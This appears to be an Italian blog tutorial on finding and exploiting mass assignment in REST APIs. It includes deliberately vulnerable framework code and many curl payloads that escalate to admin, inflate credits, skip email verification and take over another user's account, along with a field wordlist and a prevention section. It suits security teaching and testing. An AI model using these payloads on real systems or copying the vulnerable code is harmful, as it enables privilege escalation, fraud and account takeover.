---
title: 'Mass Assignment: Come Trovarlo e Sfruttarlo nelle API'
slug: mass-assignment
description: 'Scopri cos’è il mass assignment, come individuarlo e sfruttarlo nelle API REST, con esempi pratici per Rails, Laravel, Django, Node.js e Burp Suite.'
image: /mass-assignment-attack-privilege-escalation.webp
draft: true
date: 2026-08-04T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - mass-assignment
  - api-security
  - broken-access-control
  - rest-api
  - burp-suite
  - owasp-api-top-10
---

# Mass Assignment: Cos'è, Come Si Trova e Come Si Sfrutta

Il **mass assignment** è una vulnerabilità in cui l'applicazione prende automaticamente i parametri che arrivano da una richiesta HTTP e li assegna direttamente alle proprietà di un oggetto o di un record nel database — senza filtrare quali parametri sono sicuri e quali no.

In pratica: mandi un campo che non dovresti poter modificare, e l'applicazione lo accetta lo stesso. Il caso più classico è diventare admin aggiungendo `"role": "admin"` a una richiesta di registrazione.

È semplice da trovare, ha un impatto spesso critico, e si nasconde soprattutto nelle API REST moderne. OWASP tratta il Mass Assignment nel Web Security Testing Guide e, nell’API Security Top 10 2023, lo include in API3:2023 — Broken Object Property Level Authorization. Nella precedente edizione del 2019 era classificato separatamente come API6:2019 — Mass Assignment.

Vedi anche: [idor](https://hackita.it/articoli/idor), [broken-access-control](https://hackita.it/articoli/broken-access-control), [auth-access-control-guida-completa](https://hackita.it/articoli/auth-access-control-guida-completa), [privilege-escalation-web](https://hackita.it/articoli/privilege-escalation-web).

***

## Come Funziona: Il Concetto Base

I framework web moderni hanno una funzionalità comoda: puoi creare o aggiornare un oggetto passando direttamente i dati della richiesta senza assegnarli uno per uno. In Rails si chiama `update(params)`, in Laravel `fill($request->all())`, in Django `serializer.save()`.

Il problema: se non specifichi esplicitamente quali campi l'utente può modificare, il framework assegna tutto — inclusi i campi che non dovrebbe.

Immagina un database con questa tabella `users`:

```
id | username | email          | password | role  | credits
1  | mario    | mario@mail.com | hash...  | user  | 0
```

Il form di registrazione ha solo username, email e password. Ma il database ha anche `role` e `credits`.

**Codice vulnerabile (Rails):**

```ruby
# Il controller prende tutti i parametri e li assegna all'utente
def create
  @user = User.new(params[:user])  # ← assegna TUTTO senza filtri
  @user.save
end
```

**Cosa manda l'utente normale:**

```http
POST /register HTTP/1.1
Content-Type: application/json

{
  "username": "mario",
  "email": "mario@mail.com",
  "password": "password123"
}
```

**Cosa manda l'attaccante:**

```http
POST /register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@mail.com",
  "password": "password123",
  "role": "admin",
  "credits": 99999
}
```

Se l'applicazione è vulnerabile, il record viene salvato con `role = "admin"` e `credits = 99999`. L'attaccante si è appena registrato come amministratore.

***

## Perché Succede: Il Lato del Developer

I framework moderni incoraggiano la produttività. Una riga come `User.new(params)` è molto più comoda che:

```ruby
@user = User.new(
  username: params[:username],
  email:    params[:email],
  password: params[:password]
  # ricordarsi di NON includere role, credits, is_admin...
)
```

Il problema è che dimenticare un campo nella whitelist non causa errori visibili — l'applicazione funziona. Ma quello stesso campo può essere impostato da chiunque.

***

## Come Si Presenta in Ogni Framework

### Ruby on Rails

Rails ha risolto il problema con i **Strong Parameters** (introdotti in Rails 4). Il developer deve esplicitamente dichiarare quali parametri sono permessi:

```ruby
# SICURO: whitelist esplicita
def user_params
  params.require(:user).permit(:username, :email, :password)
  # role e credits non sono nella whitelist → ignorati
end

def create
  @user = User.new(user_params)
  @user.save
end

# VULNERABILE: nessun filtro
def create
  @user = User.new(params[:user])  # assegna tutto
  @user.save
end

# VULNERABILE: whitelist troppo permissiva
def user_params
  params.require(:user).permit!  # permit! = permetti TUTTO ← errore comune
end
```

**Come testi in Rails:**

```bash
# Cerca nelle response o nel codice esposto se .permit! è usato
# Poi aggiungi parametri extra alla request
curl -X POST "https://target.com/users" \
  -H "Content-Type: application/json" \
  -d '{"user": {"username":"test","email":"test@test.com","password":"pass","role":"admin"}}'

# Verifica: l'utente creato ha role=admin?
curl "https://target.com/users/me" -H "Cookie: session=..."
# {"username":"test","role":"admin"} → vulnerabile
```

### Laravel (PHP)

Laravel usa `$fillable` e `$guarded` nei modelli Eloquent:

```php
// SICURO: solo i campi in $fillable possono essere assegnati in massa
class User extends Model {
    protected $fillable = ['username', 'email', 'password'];
    // role e is_admin non sono qui → ignorati da fill()
}

// VULNERABILE: $guarded vuoto = tutto è assegnabile
class User extends Model {
    protected $guarded = [];  // ← nessuna protezione
}

// VULNERABILE: $guarded manca del tutto (il default di alcuni tutorial vecchi)
class User extends Model {
    // senza $fillable né $guarded → tutto assegnabile
}

// VULNERABILE nel controller: passa tutto il request
public function store(Request $request) {
    User::create($request->all());  // ← assegna tutto senza filtri
}
```

**Come testi in Laravel:**

```bash
# Aggiungi campi extra alla request di registrazione/aggiornamento
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","password":"pass","password_confirmation":"pass","is_admin":true}'

# Oppure con form data
curl -X POST "https://target.com/register" \
  -d "name=test&email=test%40test.com&password=pass&password_confirmation=pass&is_admin=1"
```

### Django (Python)

In Django il problema si presenta nei serializer DRF (Django REST Framework):

```python
# SICURO: fields espliciti
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email', 'password']
        # role e is_staff non sono qui → ignorati

# VULNERABILE: fields = '__all__' → tutto è esposto e assegnabile
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # ← assegna tutto, inclusi is_staff, is_superuser

# VULNERABILE: read_only_fields non impostato per campi sensibili
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email', 'password', 'role']
        # role è in fields ma non in read_only_fields → scrivibile dall'utente
```

**Come testi in Django:**

```bash
curl -X POST "https://target.com/api/users/" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"pass","is_staff":true,"is_superuser":true}'
```

### Node.js / Express con Mongoose

```javascript
// VULNERABILE: assegna direttamente l'intero body
app.post('/users', async (req, res) => {
  const user = new User(req.body);  // ← req.body viene da te
  await user.save();
  res.json(user);
});

// SICURO: whitelist esplicita
app.post('/users', async (req, res) => {
  const user = new User({
    username: req.body.username,
    email:    req.body.email,
    password: req.body.password
    // role non viene mai preso da req.body
  });
  await user.save();
});
```

**Come testi in Node.js:**

```bash
curl -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"pass","role":"admin","__proto__":{"isAdmin":true}}'
# Nota: __proto__ è un vettore aggiuntivo (prototype pollution) in alcuni stack Node.js
```

***

## Come Trovare Mass Assignment: Metodologia

### Passo 1 — Leggi la Documentazione dell'API o il Codice

Se hai accesso alla documentazione (Swagger, OpenAPI, Postman collection), cerca la differenza tra i campi che il server restituisce in GET e quelli che accetta in POST/PUT.

```bash
# Fetch della documentazione Swagger/OpenAPI
curl "https://target.com/api/swagger.json" | python3 -m json.tool
curl "https://target.com/api/docs"
curl "https://target.com/openapi.yaml"

# Confronta:
# GET /users/me → restituisce: {id, username, email, role, credits, is_admin}
# POST /users   → documentazione dice: {username, email, password}
# → role, credits, is_admin NON sono nella documentazione PUT/POST
#   ma esistono nel modello → prova ad aggiungerli alla request
```

### Passo 2 — Confronta GET e POST/PUT

Manda una GET e guarda tutti i campi che il server restituisce. Poi manda una POST o PUT aggiungendo quei campi extra nella richiesta.

```bash
# Passo 1: vedi cosa restituisce il profilo
curl "https://target.com/api/users/me" \
  -H "Authorization: Bearer TOKEN"
# Response:
# {
#   "id": 42,
#   "username": "mario",
#   "email": "mario@mail.com",
#   "role": "user",          ← esiste nel modello
#   "credits": 100,          ← esiste nel modello
#   "is_admin": false,       ← esiste nel modello
#   "subscription": "free"   ← esiste nel modello
# }

# Passo 2: prova ad aggiornare quei campi
curl -X PUT "https://target.com/api/users/me" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role": "admin",
    "is_admin": true,
    "credits": 99999,
    "subscription": "premium"
  }'

# Passo 3: rileggi il profilo
curl "https://target.com/api/users/me" \
  -H "Authorization: Bearer TOKEN"
# Se role o is_admin sono cambiati → mass assignment confermato
```

### Passo 3 — Testa Durante la Registrazione

La registrazione è spesso il punto più vulnerabile perché i developer pensano solo ai campi del form.

```bash
# Prova i campi sensibili più comuni
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@test.com",
    "password": "Password123!",
    "role": "admin",
    "is_admin": true,
    "is_staff": true,
    "admin": true,
    "verified": true,
    "email_verified": true,
    "credits": 99999,
    "balance": 99999,
    "subscription_plan": "enterprise",
    "account_type": "premium"
  }'

# Poi verifica cosa è stato salvato:
# Login e controlla il profilo, oppure guarda la response della registrazione stessa
```

### Passo 4 — Usa Burp per Intercettare e Modificare

```
1. Intercetta la request di aggiornamento profilo con Burp
2. Inviala al Repeater (Ctrl+R)
3. Aggiungi campi extra nel body JSON
4. Manda la request e confronta la response
5. Se i campi extra compaiono nella response → mass assignment
```

### Passo 5 — Testa con Formati Diversi

Alcune applicazioni filtrano solo le request JSON ma non quelle form-encoded, o viceversa:

```bash
# JSON
curl -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","role":"admin"}'

# Form URL-encoded
curl -X POST "https://target.com/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&role=admin"

# Multipart (form con file)
curl -X POST "https://target.com/profile" \
  -F "username=test" \
  -F "role=admin"
```

***

## Campi da Testare Sempre

Questi sono i campi che cercano quasi tutti i pentester e bug hunter:

```
RUOLO / PERMESSI
role, roles, user_role, account_type, user_type, type
is_admin, admin, isAdmin, is_staff, is_superuser
permission, permissions, access_level, privilege

VERIFICA / STATO ACCOUNT
verified, email_verified, phone_verified, is_verified
active, is_active, activated, status, account_status
banned, is_banned, suspended

CREDITI / SALDO
credits, balance, tokens, points, coins
subscription, subscription_plan, plan, tier
premium, is_premium, pro, enterprise

RELAZIONI (per IDOR via mass assignment)
user_id, owner_id, account_id, organization_id, company_id
# → Cambia user_id con l'ID di un altro utente = prendi il controllo dell'account

METADATI TECNICI
created_at, updated_at  → alcuni DB accettano date false
password_hash           → se accettato → bypass auth
api_key, token          → se assegnabile → generi il tuo token
```

***

## Esempi di Escalation Reali

### Da Utente a Admin (il caso più comune)

```bash
# Durante la registrazione
curl -X POST "https://target.com/api/v1/users" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"pass","role":"admin"}'

# Risposta vulnerabile:
# {"id":99,"email":"attacker@evil.com","role":"admin"}
# ← role è stato accettato → sei admin
```

### Da Free a Premium Senza Pagare

```bash
curl -X PUT "https://target.com/api/account" \
  -H "Authorization: Bearer TOKEN_UTENTE_FREE" \
  -H "Content-Type: application/json" \
  -d '{"subscription_plan":"enterprise","credits":99999}'

# Se l'applicazione accetta → hai sblocato tutte le feature premium gratuitamente
```

### Prendere il Controllo dell'Account di Un Altro Utente

Alcune applicazioni accettano `user_id` o `owner_id` nelle request di aggiornamento:

```bash
# Aggiorna il tuo profilo MA con l'ID di un altro utente
curl -X PUT "https://target.com/api/profile" \
  -H "Authorization: Bearer MIO_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "email": "attacker@evil.com"}'

# Se l'applicazione cambia l'email dell'utente 1 (admin) → account takeover
```

### Verificare la Propria Email Senza Ricevere il Link

```bash
curl -X PUT "https://target.com/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email_verified": true, "phone_verified": true}'

# Alcune applicazioni rimuovono limitazioni agli account non verificati
# → bypasdi la verifica email senza accedervi
```

***

## Mass Assignment nelle API REST (OWASP API6)

Nelle API moderne il problema è amplificato perché i developer restituiscono spesso l'oggetto completo nella response GET — esponendo involontariamente tutti i campi del modello. Questo ti dice esattamente quali campi esistono e puoi provare a scrivere.

```bash
# Pattern da seguire sistematicamente:

# 1. GET → vedi tutti i campi del modello
GET /api/v1/users/me
# {"id":42,"username":"mario","role":"user","plan":"free","balance":0,"internal_id":"abc-123"}

# 2. Identifica i campi sensibili che non dovresti poter modificare:
#    role, plan, balance, internal_id

# 3. POST/PUT → prova ad assegnarli
PUT /api/v1/users/me
{"role":"admin","plan":"enterprise","balance":10000}

# 4. GET → controlla se sono cambiati
GET /api/v1/users/me
# {"role":"admin","plan":"enterprise","balance":10000} → vulnerabile
```

***

## Checklist

```
RECONNAISSANCE
☐ Swagger/OpenAPI disponibile? Confronta campi GET vs POST/PUT
☐ Tutti i campi visibili in GET annotati
☐ Campi sensibili identificati: role, is_admin, credits, verified...

TESTING REGISTRAZIONE
☐ role / user_role / account_type aggiunto alla request
☐ is_admin / admin / is_staff / is_superuser aggiunto
☐ credits / balance / subscription aggiunto
☐ email_verified / verified aggiunto
☐ Risposta verificata: i campi sono stati accettati?

TESTING AGGIORNAMENTO PROFILO
☐ PUT/PATCH /profile testato con campi extra
☐ Confronto GET prima e dopo aggiornamento
☐ user_id / owner_id testato (IDOR via mass assignment)

TESTING FORMATI
☐ JSON testato
☐ Form URL-encoded testato
☐ Multipart testato

ESCALATION
☐ role=admin confermato → accesso panel admin verificato?
☐ is_admin=true confermato → funzionalità admin accessibili?
☐ credits/balance modificati → funzionalità premium sbloccate?
☐ email_verified=true → limitazioni account rimosse?
☐ user_id di altro utente → ATO confermato?
```

***

## FAQ

**Come faccio a sapere quali campi esistono nel modello se non vedo la documentazione?**
Guarda la response delle GET. Molte API restituiscono il modello completo anche per utenti normali. Cerca anche error page o stack trace che rivelano la struttura del database. Prova anche campi comuni per naming convention: se vedi `role`, prova anche `roles`, `user_role`, `account_type`.

**Il campo viene accettato nella response ma non sembra cambiare nulla. Perché?**
L'applicazione potrebbe accettare il campo in input ma ignorarlo al momento del salvataggio, oppure il campo viene salvato ma non usato nei controlli di accesso. Verifica sempre che il cambio abbia effetto reale: prova ad accedere a funzionalità admin, verifica il saldo effettivo, ecc.

**Che differenza c'è tra mass assignment e IDOR?**
IDOR = accedi a un oggetto che non è tuo (cambi l'ID nella request). Mass assignment = modifichi campi che non dovresti poter modificare nel tuo oggetto (aggiungi campi extra). Spesso si combinano: cambi `user_id` (IDOR) e aggiungi `role=admin` (mass assignment) nella stessa request.

**Qual è la severità in un report?**
Dipende dall'impatto. Da utente a admin → **Critical**. Modifica saldo/crediti → **High**. Bypass verifica email → **Medium/High**. Accesso a funzionalità premium senza pagare → **Medium**.

**Come si previene?**
Con una whitelist esplicita dei campi accettabili per ogni endpoint: `permit()` in Rails, `$fillable` in Laravel, `fields` nel serializer Django, deserializzazione manuale in Node. Non usare mai `params.permit!`, `$guarded = []`, o `request->all()` su modelli con campi sensibili.

***

> Hai aggiunto `"role":"admin"` alla request di registrazione. L'applicazione inizia a tremare…
